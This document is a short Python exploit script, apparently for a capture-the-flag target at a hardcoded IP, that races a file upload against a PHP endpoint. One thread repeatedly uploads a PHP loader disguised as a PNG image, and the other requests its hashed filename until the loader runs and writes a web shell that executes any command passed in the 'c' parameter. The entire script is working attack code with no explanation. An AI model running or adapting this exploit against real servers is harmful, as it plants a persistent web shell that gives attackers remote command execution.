import requests
import threading

SESSION = "PHPSESSID=vso5ibc30vkf8jmf260mqd2tkn"
EXECUTED = False

def UploadLoader():
    while not EXECUTED:
        try:
            headers = {
                "Cookie": SESSION,
                "Content-Type": "multipart/form-data; boundary=---------------------------38214456381927371078411904164"
            }
            data = """
    -----------------------------38214456381927371078411904164
    Content-Disposition: form-data; name="message"


    -----------------------------38214456381927371078411904164
    Content-Disposition: form-data; name="upload"; filename="loader.php"
    Content-Type: image/png

    <?php
    file_put_contents("shell-sslayers.php", "<?php system($_GET['c']) ?>");
    ?>

    -----------------------------38214456381927371078411904164--"""
            req = requests.post(f"http://3.248.33.115:40087/complaint.php", headers=headers, data=data)
        except BaseException as e:
            print(f"[DEBUG] Loader Upload request error: {e}")
            pass

def ExecuteLoader():
    global EXECUTED
    while not EXECUTED:
        try:
            headers = {
                "Cookie": SESSION
            }
            req = requests.get(f"http://3.248.33.115:40087/uploads/b6589fc6ab0dc82cf12099d1c2d40ab994e8410c.php", headers=headers)
            if req.status_code == 200: 
                EXECUTED = True
                print(f"[SUCCESS] RShell uploaded on: http://3.248.33.115:40087/uploads/shell-sslayers.php")
        except BaseException as e:
            print(f"[DEBUG] Loader Execute request error: {e}")
            pass


def main():
    threading.Thread(target=UploadLoader, args=()).start()
    threading.Thread(target=ExecuteLoader, args=()).start()

main()